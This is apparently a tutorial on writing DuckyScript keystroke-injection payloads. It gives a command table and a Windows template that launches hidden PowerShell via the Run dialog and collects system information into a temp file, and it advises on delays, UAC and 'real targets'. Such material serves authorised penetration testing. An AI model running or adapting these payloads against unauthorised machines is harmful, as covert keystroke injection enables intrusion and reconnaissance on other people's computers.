# Writing Custom Payloads

## DuckyScript Basics

```duckyscript
REM This is a comment
DELAY 1000
STRING Hello World
ENTER
```

## Command Reference

| Command | Description | Example |
|---------|-------------|---------|
| `REM` | Comment | `REM This does nothing` |
| `DELAY` | Wait (ms) | `DELAY 500` |
| `STRING` | Type text | `STRING whoami` |
| `ENTER` | Press Enter | `ENTER` |
| `GUI` | Windows/Super key | `GUI r` |
| `ALT` | Alt key | `ALT F4` |
| `CTRL` | Control key | `CTRL c` |
| `TAB` | Tab key | `TAB` |
| `SHIFT` | Shift key | `SHIFT TAB` |
| `UPARROW` | Arrow up | `UPARROW` |
| `DOWNARROW` | Arrow down | `DOWNARROW` |

## Payload Template

```duckyscript
REM ======================
REM Title: My Custom Payload
REM Author: bad-antics
REM Target: Windows 10/11
REM ======================

REM Open PowerShell as admin
DELAY 2000
GUI r
DELAY 500
STRING powershell -w hidden
ENTER
DELAY 1000

REM Your commands here
STRING Get-ComputerInfo | Out-File $env:TEMP\info.txt
ENTER

REM Cleanup
STRING exit
ENTER
```

## Best Practices

1. **Always add delays** — Systems vary in speed
2. **Test locally first** — Use a VM before real targets
3. **Handle UAC** — Windows may prompt for elevation
4. **Consider keyboard layouts** — Use `-l` flag in encoder
5. **Add error handling** — Check if commands succeed
